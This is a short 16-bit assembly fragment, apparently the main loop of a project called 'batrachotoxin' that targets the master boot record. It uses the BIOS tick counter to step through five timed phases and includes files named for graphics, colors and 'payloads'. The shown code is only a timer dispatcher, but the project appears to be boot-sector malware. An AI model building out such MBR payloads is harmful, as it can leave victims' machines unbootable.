[bits 16]

main_sequence:
    mov ax, 0x0040
    mov gs, ax
    mov eax, [gs:0x006C]
    sub eax, [start_tick]
    
    cmp eax, 55
    jb phase1
    cmp eax, 145
    jb phase2
    cmp eax, 236
    jb phase3
    cmp eax, 327
    jb phase4
    cmp eax, 419
    jb phase5
    
    mov eax, [gs:0x006C]
    mov [start_tick], eax
    jmp phase1

%include "batrachotoxin/MBR/graphics.asm"
%include "batrachotoxin/MBR/payloads.asm"
%include "batrachotoxin/MBR/colors.asm"
%include "batrachotoxin/MBR/threads.asm"
%include "batrachotoxin/MBR/print.asm"
%include "batrachotoxin/MBR/timer.asm"
%include "batrachotoxin/MBR/math.asm"